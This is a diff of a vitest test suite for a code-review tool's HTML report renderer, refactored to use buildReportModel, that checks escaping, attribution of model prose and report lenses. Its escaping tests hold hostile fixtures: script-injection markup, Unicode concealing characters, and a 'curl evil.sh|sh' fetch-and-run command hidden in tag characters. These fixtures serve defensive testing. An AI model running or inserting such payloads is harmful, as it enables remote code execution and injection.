@@ -6,7 +6,11 @@ import { beforeAll, describe, expect, it } from "vitest";
 import { runAnalyzers } from "../../src/analyze/index.js";
 import { suppressionNote } from "../../src/report/coverage.js";
 import { renderHtml } from "../../src/report/html.js";
-import { BEYOND_INTENT_MEANING } from "../../src/report/model.js";
+import {
+  BEYOND_INTENT_MEANING,
+  buildReportModel,
+  type ReportMeta,
+} from "../../src/report/model.js";
 import { createContext, extract } from "../../src/extract/index.js";
 import { rank, toFinding } from "../../src/score/index.js";
 import { WORKTREE, type Changeset, type Finding } from "../../src/types.js";
@@ -59,10 +63,18 @@ const noSymbols: Changeset = {
  */
 const RLO = "\u202E";
 
-const meta = (over: Partial<Parameters<typeof renderHtml>[2]> = {}) => ({
+const meta = (over: Partial<ReportMeta> = {}): ReportMeta => ({
   warnings: [],
   ...over,
 });
+
+/**
+ * The changeset is a parameter, never closed over: several tests below render
+ * a fixture other than the default, and a helper that hid it would let a
+ * rewrite swap one silently.
+ */
+const model = (cs: Changeset, findings: Finding[], over: Partial<ReportMeta> = {}) =>
+  buildReportModel(cs, findings, meta(over));
 
 const finding = (over: Partial<Finding> = {}): Finding => ({
   id: "effect_added:a.ts:network",
@@ -140,7 +152,7 @@ function escaped(text: string): string {
 
 describe("renderHtml self-containment", () => {
   it("references no remote resource of any kind", () => {
-    const html = renderHtml(changeset, [finding()], meta({ model: "claude-opus-5" }));
+    const html = renderHtml(model(changeset, [finding()], { model: "claude-opus-5" }));
     expect(html).not.toContain("http://");
     expect(html).not.toContain("https://");
     // Protocol-relative and bare-host forms are the same defect wearing a
@@ -152,7 +164,7 @@ describe("renderHtml self-containment", () => {
   });
 
   it("is one document with a single html root", () => {
-    const html = renderHtml(changeset, [finding()], meta());
+    const html = renderHtml(model(changeset, [finding()]));
     expect(html.startsWith("<!doctype html>")).toBe(true);
     expect(count(html, "<html")).toBe(1);
     expect(count(html, "</html>")).toBe(1);
@@ -161,13 +173,13 @@ describe("renderHtml self-containment", () => {
   });
 
   it("carries its own light and dark palette with an explicit body background", () => {
-    const html = renderHtml(changeset, [finding()], meta());
+    const html = renderHtml(model(changeset, [finding()]));
     expect(html).toContain("prefers-color-scheme: dark");
     expect(html).toMatch(/body\s*\{[^}]*background:\s*var\(--bg\)/);
   });
 
   it("scrolls wide content inside its own container", () => {
-    const html = renderHtml(changeset, [finding()], meta());
+    const html = renderHtml(model(changeset, [finding()]));
     expect(html).toMatch(/\.excerpt\s*\{[^}]*overflow-x:\s*auto/);
     expect(html).toMatch(/\.table-scroll\s*\{[^}]*overflow-x:\s*auto/);
   });
@@ -175,7 +187,7 @@ describe("renderHtml self-containment", () => {
 
 describe("renderHtml header", () => {
   it("carries the change scope", () => {
-    const html = renderHtml(changeset, [finding()], meta());
+    const html = renderHtml(model(changeset, [finding()]));
     expect(html).toContain("vs origin/main");
     expect(html).toContain("2 files");
     expect(html).toContain("7 lines changed");
@@ -183,14 +195,16 @@ describe("renderHtml header", () => {
 
   it("counts each tier", () => {
     const html = renderHtml(
-      changeset,
-      [
-        finding(),
-        finding({ id: "guard_removed:a.ts:9:f:x", tier: "inferred", claim: { summary: "s", reasoning: "r" } }),
-        finding({ id: "claim:0:c1", tier: "model", evidence: [] }),
-        finding({ id: "claim:1:c2", tier: "model", evidence: [] }),
-      ],
-      meta({ model: "claude-opus-5" }),
+      model(
+        changeset,
+        [
+          finding(),
+          finding({ id: "guard_removed:a.ts:9:f:x", tier: "inferred", claim: { summary: "s", reasoning: "r" } }),
+          finding({ id: "claim:0:c1", tier: "model", evidence: [] }),
+          finding({ id: "claim:1:c2", tier: "model", evidence: [] }),
+        ],
+        { model: "claude-opus-5" },
+      ),
     );
     expect(html).toContain("▲ 1 verified");
     expect(html).toContain("● 1 inferred");
@@ -202,16 +216,16 @@ describe("renderHtml header", () => {
     // `review` in `src/cli.ts`, which pushes `result.skipped` into
     // `warnings`. It used to arrive twice, through a second `meta` field too.
     const reason = "--no-llm was set, so the model was not asked";
-    const html = renderHtml(changeset, [finding()], meta({ warnings: [reason] }));
+    const html = renderHtml(model(changeset, [finding()], { warnings: [reason] }));
     expect(html).toContain("This review is partial.");
     expect(count(html, reason)).toBe(1);
   });
 
   it("shows every warning rather than swallowing it", () => {
     const html = renderHtml(
-      changeset,
-      [finding()],
-      meta({ warnings: ["the surfaceAnalyzer analyzer failed, so this review is partial: boom"] }),
+      model(changeset, [finding()], {
+        warnings: ["the surfaceAnalyzer analyzer failed, so this review is partial: boom"],
+      }),
     );
     expect(html).toContain("surfaceAnalyzer analyzer failed");
     expect(html.indexOf("surfaceAnalyzer")).toBeLessThan(html.indexOf("introduces a network"));
@@ -220,24 +234,24 @@ describe("renderHtml header", () => {
   it("discloses the standalone-reach filter with the same sentence the terminal prints", () => {
     // Both surfaces must state the filter or neither may claim to — the
     // sentence is single-sourced in `suppressionNote` so they cannot drift.
-    const html = renderHtml(changeset, [finding()], meta({ suppressed: 2 }));
+    const html = renderHtml(model(changeset, [finding()], { suppressed: 2 }));
     expect(html).toContain(suppressionNote(2));
     // A filter disclosure is not a shortfall: the review is complete.
     expect(html).not.toContain("This review is partial.");
   });
 
   it("says nothing about filtering when nothing was suppressed", () => {
-    expect(renderHtml(changeset, [finding()], meta())).not.toContain("Filtered:");
-    expect(renderHtml(changeset, [finding()], meta({ suppressed: 0 }))).not.toContain("Filtered:");
+    expect(renderHtml(model(changeset, [finding()]))).not.toContain("Filtered:");
+    expect(renderHtml(model(changeset, [finding()], { suppressed: 0 }))).not.toContain("Filtered:");
   });
 
   it("stays quiet about partiality when nothing went wrong", () => {
-    const html = renderHtml(changeset, [finding()], meta());
+    const html = renderHtml(model(changeset, [finding()]));
     expect(html).not.toContain("This review is partial.");
   });
 
   it("counts untracked files as a reason the review is partial", () => {
-    const html = renderHtml({ ...changeset, untrackedCount: 2 }, [finding()], meta());
+    const html = renderHtml(model({ ...changeset, untrackedCount: 2 }, [finding()]));
     expect(html).toContain("2 untracked files not reviewed");
   });
 
@@ -246,15 +260,16 @@ describe("renderHtml header", () => {
     // and the report has to say so. It is also routine, so it must not trip
     // the banner that exists for a dead analyzer or an unasked model.
     const html = renderHtml(
-      {
-        ...changeset,
-        files: [
-          ...changeset.files,
-          { path: "gone.ts", status: "deleted", hunks: [], symbols: [] },
-        ],
-      },
-      [finding()],
-      meta(),
+      model(
+        {
+          ...changeset,
+          files: [
+            ...changeset.files,
+            { path: "gone.ts", status: "deleted", hunks: [], symbols: [] },
+          ],
+        },
+        [finding()],
+      ),
     );
     expect(html).toContain("1 deleted TypeScript file: gone.ts");
     expect(html).not.toContain("This review is partial.");
@@ -276,7 +291,7 @@ describe("renderHtml findings", () => {
       }),
       finding({ id: "guard_removed:b.ts:5:g:x", file: "b.ts", line: 5, evidence: [{ file: "b.ts", line: 5, excerpt: "if (ok) return;", side: "before" }] }),
     ];
-    const html = renderHtml(changeset, findings, meta());
+    const html = renderHtml(model(changeset, findings));
     // Unlike the terminal, which shows two and counts the rest: this is the
     // surface a reader opens when the summary was not enough.
     for (const e of findings.flatMap((f) => f.evidence)) {
@@ -286,9 +301,10 @@ describe("renderHtml findings", () => {
 
   it("ranks findings in the order given, numbered from one", () => {
     const html = renderHtml(
-      changeset,
-      [finding({ title: "first" }), finding({ id: "effect_added:b.ts:env", title: "second" })],
-      meta(),
+      model(changeset, [
+        finding({ title: "first" }),
+        finding({ id: "effect_added:b.ts:env", title: "second" }),
+      ]),
     );
     expect(html.indexOf("first")).toBeLessThan(html.indexOf("second"));
     expect(lens(html, "narrative")).toContain(`<span class="rank">1</span>`);
@@ -296,9 +312,10 @@ describe("renderHtml findings", () => {
 
   it("numbers the narrative but not a filtered lens, where a position is not a rank", () => {
     const html = renderHtml(
-      changeset,
-      [finding(), finding({ id: "guard_removed:a.ts:9:f:if", title: "a guard went" })],
-      meta(),
+      model(changeset, [
+        finding(),
+        finding({ id: "guard_removed:a.ts:9:f:if", title: "a guard went" }),
+      ]),
     );
     expect(lens(html, "narrative")).toContain(`<span class="rank">2</span>`);
     // The guard finding is second overall and first in its section; neither
@@ -309,13 +326,15 @@ describe("renderHtml findings", () => {
 
   it("badges every finding with its tier, once per lens it appears in", () => {
     const html = renderHtml(
-      changeset,
-      [
-        finding(),
-        finding({ id: "signature_changed:a.ts:3:send:send", tier: "inferred", claim: { summary: "s", reasoning: "hot path" } }),
-        finding({ id: "claim:0:c1", tier: "model", evidence: [] }),
-      ],
-      meta({ model: "claude-opus-5" }),
+      model(
+        changeset,
+        [
+          finding(),
+          finding({ id: "signature_changed:a.ts:3:send:send", tier: "inferred", claim: { summary: "s", reasoning: "hot path" } }),
+          finding({ id: "claim:0:c1", tier: "model", evidence: [] }),
+        ],
+        { model: "claude-opus-5" },
+      ),
     );
     const narrative = lens(html, "narrative");
     expect(count(narrative, "badge-verified")).toBe(1);
@@ -325,16 +344,14 @@ describe("renderHtml findings", () => {
 
   it("marks a before-side location so it is not read as a working-tree line", () => {
     const html = renderHtml(
-      changeset,
-      [
+      model(changeset, [
         finding({
           id: "guard_removed:old.ts:119:diff:if",
           file: "old.ts",
           line: 119,
           evidence: [{ file: "old.ts", line: 119, excerpt: "if (seen) continue;", side: "before" }],
         }),
-      ],
-      meta(),
+      ]),
     );
     const narrative = lens(html, "narrative");
     expect(narrative).toContain("old.ts:119");
@@ -345,16 +362,16 @@ describe("renderHtml findings", () => {
   it("leaves after-side locations unmarked", () => {
     // In the lens, not the whole document: the stylesheet names the class
     // unconditionally, so a document-wide search proves nothing.
-    expect(lens(renderHtml(changeset, [finding()], meta()), "narrative")).not.toContain(
+    expect(lens(renderHtml(model(changeset, [finding()])), "narrative")).not.toContain(
       "chip-before",
     );
   });
 
   it("says plainly when a finding has no evidence", () => {
     const html = renderHtml(
-      changeset,
-      [finding({ id: "claim:0:c1", tier: "model", evidence: [] })],
-      meta({ model: "claude-opus-5" }),
+      model(changeset, [finding({ id: "claim:0:c1", tier: "model", evidence: [] })], {
+        model: "claude-opus-5",
+      }),
     );
     expect(html).toContain("No evidence");
   });
@@ -378,7 +395,7 @@ describe("renderHtml model attribution", () => {
   });
 
   it("marks a model-tier finding unverified and names the model", () => {
-    const html = renderHtml(changeset, [modelOnly], meta({ model: "claude-opus-5" }));
+    const html = renderHtml(model(changeset, [modelOnly], { model: "claude-opus-5" }));
     expect(html).toContain("unverified");
     expect(html).toContain("claude-opus-5");
     expect(html).toContain("Nothing mechanical corroborates this.");
@@ -390,7 +407,10 @@ describe("renderHtml model attribution", () => {
     // has to be able to see whose claim it is without scrolling back.
     // In the lens, not the header: the legend's badge is a specimen of the
     // badge, with no finding and so no model behind it.
-    const narrative = lens(renderHtml(changeset, [modelOnly], meta({ model: "claude-opus-5" })), "narrative");
+    const narrative = lens(
+      renderHtml(model(changeset, [modelOnly], { model: "claude-opus-5" })),
+      "narrative",
+    );
     const badges = [...narrative.matchAll(/<span class="badge badge-model">([^<]*)<\/span>/g)].map(
       (m) => m[1],
     );
@@ -405,9 +425,7 @@ describe("renderHtml model attribution", () => {
     // The dashed border and unfilled background that make a model-tier card
     // read as a different kind of object at a glance hang off this class.
     const html = renderHtml(
-      changeset,
-      [finding(), inferred, modelOnly],
-      meta({ model: "claude-opus-5" }),
+      model(changeset, [finding(), inferred, modelOnly], { model: "claude-opus-5" }),
     );
     const narrative = lens(html, "narrative");
     for (const tier of ["verified", "inferred", "model"]) {
@@ -417,7 +435,7 @@ describe("renderHtml model attribution", () => {
   });
 
   it("never renders model prose outside an attributed block", () => {
-    const html = renderHtml(changeset, [inferred, modelOnly], meta({ model: "claude-opus-5" }));
+    const html = renderHtml(model(changeset, [inferred, modelOnly], { model: "claude-opus-5" }));
     const blocks = modelBlocks(html);
     expect(blocks.length).toBeGreaterThan(0);
     for (const block of blocks) {
@@ -438,7 +456,7 @@ describe("renderHtml model attribution", () => {
     // A model-tier finding's whole body is model prose, so suppressing it —
     // the terminal renderer's answer — would leave a headline with nothing
     // under it. The attribution stays, visibly incomplete.
-    const html = renderHtml(changeset, [inferred, modelOnly], meta());
+    const html = renderHtml(model(changeset, [inferred, modelOnly]));
     for (const block of modelBlocks(html)) {
       expect(block).toContain("an unnamed model");
     }
@@ -449,7 +467,7 @@ describe("renderHtml model attribution", () => {
   });
 
   it("never shows a model-authored headline without a tier badge beside it", () => {
-    const html = renderHtml(changeset, [modelOnly], meta());
+    const html = renderHtml(model(changeset, [modelOnly]));
     const headlines = summaries(html).filter((s) => s.includes("unbounded retry loop"));
     expect(headlines.length).toBeGreaterThan(0);
     for (const head of headlines) {
@@ -459,17 +477,17 @@ describe("renderHtml model attribution", () => {
   });
 
   it("names the model in a provenance line when anything is inferred or model-only", () => {
-    const html = renderHtml(changeset, [inferred], meta({ model: "claude-opus-5" }));
+    const html = renderHtml(model(changeset, [inferred], { model: "claude-opus-5" }));
     expect(html).toContain("claude-opus-5 interpreted this change");
   });
 
   it("omits the provenance line when every finding is verified", () => {
-    const html = renderHtml(changeset, [finding()], meta({ model: "claude-opus-5" }));
+    const html = renderHtml(model(changeset, [finding()], { model: "claude-opus-5" }));
     expect(html).not.toContain("interpreted this change");
   });
 
   it("says nothing extra for a finding with no claim attached", () => {
-    const html = renderHtml(changeset, [finding()], meta({ model: "claude-opus-5" }));
+    const html = renderHtml(model(changeset, [finding()], { model: "claude-opus-5" }));
     expect(modelBlocks(html)).toHaveLength(0);
   });
 });
@@ -494,7 +512,7 @@ describe("renderHtml escaping", () => {
   });
 
   it("neutralizes markup in every model- and code-authored field", () => {
-    const html = renderHtml(changeset, [hostile], meta({ model: `claude<&>opus` }));
+    const html = renderHtml(model(changeset, [hostile], { model: `claude<&>opus` }));
     expect(html).not.toContain(`alert("title")`);
     expect(html).not.toContain(`<img src=x`);
     expect(html).not.toContain("<b>markup</b>");
@@ -508,14 +526,14 @@ describe("renderHtml escaping", () => {
   });
 
   it("leaves the document with only its own two scripts", () => {
-    const html = renderHtml(changeset, [hostile], meta({ model: "claude-opus-5" }));
+    const html = renderHtml(model(changeset, [hostile], { model: "claude-opus-5" }));
     expect(scripts(html)).toHaveLength(2);
     expect(count(html, "<script")).toBe(2);
   });
 
   it("puts no report data inside the inline script", () => {
     const marked = finding({ title: "MARKER_TITLE", body: "MARKER_BODY" });
-    const html = renderHtml(changeset, [marked], meta({ model: "MARKER_MODEL" }));
+    const html = renderHtml(model(changeset, [marked], { model: "MARKER_MODEL" }));
     for (const script of scripts(html)) {
       expect(script).not.toContain("MARKER_TITLE");
       expect(script).not.toContain("MARKER_BODY");
@@ -525,16 +543,18 @@ describe("renderHtml escaping", () => {
 
   it("sets backticked prose as code without letting its contents become markup", () => {
     const html = renderHtml(
-      changeset,
-      [
-        finding({
-          title: "`send` changed",
-          body: "The `<script>` tag is what it is called, not what it does.",
-          claim: { summary: "s", reasoning: "It reads `process.env.KEY` directly." },
-          tier: "inferred",
-        }),
-      ],
-      meta({ model: "claude-opus-5" }),
+      model(
+        changeset,
+        [
+          finding({
+            title: "`send` changed",
+            body: "The `<script>` tag is what it is called, not what it does.",
+            claim: { summary: "s", reasoning: "It reads `process.env.KEY` directly." },
+            tier: "inferred",
+          }),
+        ],
+        { model: "claude-opus-5" },
+      ),
     );
     expect(html).toContain("<code>send</code>");
     expect(html).toContain("<code>&lt;script&gt;</code>");
@@ -543,7 +563,7 @@ describe("renderHtml escaping", () => {
   });
 
   it("leaves an unpaired backtick as text", () => {
-    const html = renderHtml(changeset, [finding({ body: "A lone ` backtick." })], meta());
+    const html = renderHtml(model(changeset, [finding({ body: "A lone ` backtick." })]));
     expect(html).toContain("A lone ` backtick.");
   });
 
@@ -555,8 +575,7 @@ describe("renderHtml escaping", () => {
     const rlo = "\u202E";
     const pdf = "\u202C";
     const html = renderHtml(
-      changeset,
-      [
+      model(changeset, [
         finding({
           evidence: [
             {
@@ -566,8 +585,7 @@ describe("renderHtml escaping", () => {
             },
           ],
         }),
-      ],
-      meta(),
+      ]),
     );
     expect(html).not.toContain(rlo);
     expect(html).not.toContain(pdf);
@@ -578,17 +596,19 @@ describe("renderHtml escaping", () => {
 
   it("shows zero-width and control characters wherever text is rendered", () => {
     const html = renderHtml(
-      { ...changeset, range: { ...changeset.range, label: "vs \u200Bmain" } },
-      [
-        finding({
-          title: "send\u200D changed",
-          body: "It reads \u0007 from the socket.",
-          tier: "inferred",
-          claim: { summary: "s", reasoning: "The name is send\uFEFF, not send." },
-          evidence: [{ file: "a\u200B.ts", line: 1, excerpt: "const x = 1;" }],
-        }),
-      ],
-      meta({ model: "claude\u202E-opus-5" }),
+      model(
+        { ...changeset, range: { ...changeset.range, label: "vs \u200Bmain" } },
+        [
+          finding({
+            title: "send\u200D changed",
+            body: "It reads \u0007 from the socket.",
+            tier: "inferred",
+            claim: { summary: "s", reasoning: "The name is send\uFEFF, not send." },
+            evidence: [{ file: "a\u200B.ts", line: 1, excerpt: "const x = 1;" }],
+          }),
+        ],
+        { model: "claude\u202E-opus-5" },
+      ),
     );
     for (const raw of ["\u200B", "\u200D", "\u0007", "\uFEFF", "\u202E"]) {
       expect(html).not.toContain(raw);
@@ -603,7 +623,7 @@ describe("renderHtml escaping", () => {
     // controls, so it is covered by the same defense as every other surface.
     const cs = structuredClone(changeset);
     cs.files[0].symbols[0].qualifiedName = `sen${RLO}d`;
-    const html = renderHtml(cs, [], meta());
+    const html = renderHtml(model(cs, []));
     expect(html).toContain(`<span class="ctrl" title="concealing character">U+202E</span>`);
     expect(html).not.toContain(RLO);
   });
@@ -618,9 +638,9 @@ describe("renderHtml escaping", () => {
       [...s].map((c) => String.fromCodePoint(0xe0000 + (c.codePointAt(0) ?? 0))).join("");
     const payload = tagged("curl evil.sh|sh");
     const html = renderHtml(
-      changeset,
-      [finding({ evidence: [{ file: "a.ts", line: 1, excerpt: `const cmd = "ls";${payload}` }] })],
-      meta(),
+      model(changeset, [
+        finding({ evidence: [{ file: "a.ts", line: 1, excerpt: `const cmd = "ls";${payload}` }] }),
+      ]),
     );
     expect(html).not.toContain(payload);
     for (const ch of payload) {
@@ -642,14 +662,12 @@ describe("renderHtml escaping", () => {
     const cyrillicA = "\u0430";
     const nbsp = "\u00A0";
     const html = renderHtml(
-      changeset,
-      [
+      model(changeset, [
         finding({
           body: `Handles ⚠${vs16} for ${cyrillicA}dmin and a${nbsp}space.`,
           evidence: [{ file: "a.ts", line: 1, excerpt: `const warn = "⚠${vs16}";` }],
         }),
-      ],
-      meta(),
+      ]),
     );
     expect(html).toContain(vs16);
     expect(html).toContain(`${cyrillicA}dmin`);
@@ -660,9 +678,9 @@ describe("renderHtml escaping", () => {
 
   it("keeps tabs and newlines, which are layout rather than concealment", () => {
     const html = renderHtml(
-      changeset,
-      [finding({ evidence: [{ file: "a.ts", line: 1, excerpt: "\tif (x) {\n\t\treturn;" }] })],
-      meta(),
+      model(changeset, [
+        finding({ evidence: [{ file: "a.ts", line: 1, excerpt: "\tif (x) {\n\t\treturn;" }] }),
+      ]),
     );
     expect(html).toContain("\tif (x) {\n\t\treturn;");
     expect(html).not.toContain("U+0009");
@@ -670,9 +688,7 @@ describe("renderHtml escaping", () => {
 
   it("escapes a hostile range label in the document title", () => {
     const html = renderHtml(
-      { ...changeset, range: { ...changeset.range, label: "vs </title><script>x</script>" } },
-      [],
-      meta(),
+      model({ ...changeset, range: { ...changeset.range, label: "vs </title><script>x</script>" } }, []),
     );
     expect(html).not.toContain("</title><script>x");
     expect(html).toContain("&lt;/title&gt;&lt;script&gt;x&lt;/script&gt;");
@@ -681,7 +697,7 @@ describe("renderHtml escaping", () => {
 
 describe("renderHtml lenses", () => {
   it("offers exactly the three lenses, narrative first", () => {
-    const html = renderHtml(changeset, [finding()], meta());
+    const html = renderHtml(model(changeset, [finding()]));
     expect(html).toContain(`id="lens-narrative"`);
     expect(html).toContain(`id="lens-effects"`);
     expect(html).toContain(`id="lens-surface"`);
@@ -691,12 +707,10 @@ describe("renderHtml lenses", () => {
 
   it("sorts an effect finding under Effects and a guard under Guards", () => {
     const html = renderHtml(
-      changeset,
-      [
+      model(changeset, [
         finding(),
         finding({ id: "guard_removed:a.ts:9:send:if", title: "an if guard was removed from send" }),
-      ],
-      meta(),
+      ]),
     );
     const effects = lens(html, "effects");
     expect(effects).toContain("Effects");
@@ -707,7 +721,7 @@ describe("renderHtml lenses", () => {
   });
 
   it("lists an exported symbol in the surface lens whether or not a finding flagged it", () => {
-    const surface = lens(renderHtml(changeset, [], meta()), "surface");
+    const surface = lens(renderHtml(model(changeset, [])), "surface");
     expect(surface).toContain("send");
     expect(surface).toContain("function");
     // Not exported, so not public surface.
@@ -715,7 +729,7 @@ describe("renderHtml lenses", () => {
   });
 
   it("says a lens is empty rather than rendering a blank pane", () => {
-    const html = renderHtml(noSymbols, [], meta());
+    const html = renderHtml(model(noSymbols, []));
     expect(lens(html, "narrative")).toContain("No findings to narrate.");
     expect(lens(html, "effects")).toContain("Nothing in this range matched this view");
     expect(lens(html, "surface")).toContain("Nothing in this range matched this view");
@@ -727,7 +741,7 @@ describe("renderHtml lenses", () => {
     // this view", never to a claim about the code — that claim would be the
     // tool asserting something false in its own voice, in the one place no
     // tier badge covers.
-    const html = renderHtml(noSymbols, [finding({ id: "blast_radius:a.ts:send" })], meta());
+    const html = renderHtml(model(noSymbols, [finding({ id: "blast_radius:a.ts:send" })]));
     const effects = lens(html, "effects");
     expect(effects).toContain("Nothing in this range matched this view");
     expect(effects).not.toContain("nothing crossed a boundary");
@@ -739,9 +753,9 @@ describe("renderHtml lenses", () => {
 
   it("keeps a model-only finding out of the analyzer-derived lenses and says so", () => {
     const html = renderHtml(
-      noSymbols,
-      [finding({ id: "claim:0:c1", tier: "model", title: "a hunch", evidence: [] })],
-      meta({ model: "claude-opus-5" }),
+      model(noSymbols, [finding({ id: "claim:0:c1", tier: "model", title: "a hunch", evidence: [] })], {
+        model: "claude-opus-5",
+      }),
     );
     expect(lens(html, "narrative")).toContain("a hunch");
     expect(lens(html, "effects")).not.toContain("a hunch");
@@ -754,9 +768,9 @@ describe("renderHtml lenses", () => {
     // in this lens filters on. That is a decision, so the lens has to say it:
     // the note used to name model-only claims as the sole omission.
     const html = renderHtml(
-      noSymbols,
-      [finding({ id: "blast_radius:a.ts:send", title: "send changed and is referenced in 4 places" })],
-      meta(),
+      model(noSymbols, [
+        finding({ id: "blast_radius:a.ts:send", title: "send changed and is referenced in 4 places" }),
+      ]),
     );
     expect(lens(html, "narrative")).toContain("referenced in 4 places");
     expect(lens(html, "effects")).not.toContain("referenced in 4 places");
@@ -769,9 +783,7 @@ describe("renderHtml lenses", () => {
     // kind arriving without a clause would make that sentence false in
     // urtext's own voice, in the one place the tier badges do not reach.
     const html = renderHtml(
-      noSymbols,
-      [finding({ id: "citation_rot:docs/a.md:1:content_drift" })],
-      meta(),
+      model(noSymbols, [finding({ id: "citation_rot:docs/a.md:1:content_drift" })]),
     );
     const effects = lens(html, "effects");
     // The clause itself, not the bare word "citation": this pane's empty
@@ -782,7 +794,7 @@ describe("renderHtml lenses", () => {
   });
 
   it("renders a citation finding's headline, body, and both evidence refs in the narrative", () => {
-    const narrative = lens(renderHtml(noSymbols, [citationFinding()], meta()), "narrative");
+    const narrative = lens(renderHtml(model(noSymbols, [citationFinding()])), "narrative");
     expect(narrative).toContain(
       `cites <code>src/a.ts:1</code>, which no longer reads the same`,
     );
@@ -801,7 +813,7 @@ describe("renderHtml lenses", () => {
     // declaration this range touched" overclaimed. (Enum declarations
     // themselves are recorded — a member change reaches this table as its
     // enum's row, and the blurb says exactly that much.)
-    const pane = lens(renderHtml(changeset, [], meta()), "surface");
+    const pane = lens(renderHtml(model(changeset, [])), "surface");
     expect(pane).toContain("<table");
     expect(pane).not.toContain("Every exported declaration");
     expect(pane).toContain("enum members and re-export declarations are not recorded");
@@ -816,7 +828,7 @@ describe("renderHtml lenses", () => {
     // said namespaces were not read at all. `declarations()` walks into them
     // and records their members qualified by the namespace — they are simply
     // not module exports, so they do not reach this table.
-    const pane = lens(renderHtml(changeset, [], meta()), "surface");
+    const pane = lens(renderHtml(model(changeset, [])), "surface");
     expect(pane).not.toContain("does not read enums, namespaces");
     expect(pane).toContain("recorded under the namespace rather than as exports of the file");
   });
@@ -825,7 +837,7 @@ describe("renderHtml lenses", () => {
     // The panes are visible markup; only a stylesheet rule keyed on a class
     // the head script sets collapses them to one. Without scripting the
     // class never appears, so nothing is unreachable.
-    const html = renderHtml(changeset, [finding()], meta());
+    const html = renderHtml(model(changeset, [finding()]));
     expect(html).toContain(".has-js .lens { display: none; }");
     expect(html).toContain(`.tabs { display: none;`);
   });
@@ -851,7 +863,7 @@ describe("renderHtml fact-kind routing", () => {
 
   for (const [id, key, present] of cases) {
     it(`${present ? "routes" : "keeps"} ${id} ${present ? "into" : "out of"} the ${key} lens`, () => {
-      const html = renderHtml(changeset, [finding({ id, title: "ROUTED" })], meta());
+      const html = renderHtml(model(changeset, [finding({ id, title: "ROUTED" })]));
       expect(lens(html, key).includes("ROUTED")).toBe(present);
       // Everything reaches the narrative regardless.
       expect(lens(html, "narrative")).toContain("ROUTED");
@@ -866,7 +878,7 @@ describe("renderHtml fact-kind routing", () => {
       "export_added_group:a.ts",
       "signature_changed_group:a.ts",
     ]) {
-      const html = renderHtml(changeset, [finding({ id, title: "ROUTED" })], meta());
+      const html = renderHtml(model(changeset, [finding({ id, title: "ROUTED" })]));
       expect(lens(html, "surface")).toContain("ROUTED");
     }
   });
@@ -875,7 +887,7 @@ describe("renderHtml fact-kind routing", () => {
     // `guard_removedX` is one character away from a prefix that routes, and
     // slicing at the sentinel index `indexOf` returns for a missing colon
     // would hand back exactly that prefix.
-    const html = renderHtml(changeset, [finding({ id: "guard_removedX", title: "ROUTED" })], meta());
+    const html = renderHtml(model(changeset, [finding({ id: "guard_removedX", title: "ROUTED" })]));
     expect(lens(html, "effects")).not.toContain("ROUTED");
     expect(lens(html, "surface")).not.toContain("ROUTED");
     expect(lens(html, "narrative")).toContain("ROUTED");
@@ -944,7 +956,7 @@ describe("renderHtml against real analyzer output", () => {
   it("routes real findings into the lens their kind belongs to", async () => {
     const cs = await extract(repo);
     const findings = rank(await runAnalyzers(cs, createContext(repo, cs.range)));
-    const html = renderHtml(cs, findings, { warnings: [] });
+    const html = renderHtml(model(cs, findings));
     const effects = lens(html, "effects");
     expect(effects).toContain("Guards");
     expect(effects).toContain("guard was removed");
@@ -960,7 +972,7 @@ describe("renderHtml against real analyzer output", () => {
   it("shows a real analyzer's excerpt verbatim in the evidence", async () => {
     const cs = await extract(repo);
     const findings = rank(await runAnalyzers(cs, createContext(repo, cs.range)));
-    const html = renderHtml(cs, findings, { warnings: [] });
+    const html = renderHtml(model(cs, findings));
     for (const e of findings.flatMap((f) => f.evidence)) {
       expect(html).toContain(escaped(e.excerpt));
     }
@@ -970,9 +982,11 @@ describe("renderHtml against real analyzer output", () => {
 describe("renderHtml beyond stated intent", () => {
   it("puts a second badge beside the tier badge and one legend item", () => {
     const html = renderHtml(
-      noSymbols,
-      [finding({ tier: "inferred", beyondIntent: true, claim: { summary: "s", reasoning: "r" } })],
-      meta({ model: "claude-opus-5" }),
+      model(
+        noSymbols,
+        [finding({ tier: "inferred", beyondIntent: true, claim: { summary: "s", reasoning: "r" } })],
+        { model: "claude-opus-5" },
+      ),
     );
     expect(html).toContain(`<span class="badge badge-intent">beyond stated intent</span>`);
     // The legend item, in the same shape as the tier legend items.
@@ -983,7 +997,7 @@ describe("renderHtml beyond stated intent", () => {
   });
 
   it("renders neither badge nor legend item when no finding carries the mark", () => {
-    const html = renderHtml(noSymbols, [finding()], meta());
+    const html = renderHtml(model(noSymbols, [finding()]));
     // The element, not the bare class name: the stylesheet is a fixed string
     // and carries the `.badge-intent` rule on every document, marked or not —
     // as it carries every other rule for markup this report may not emit.
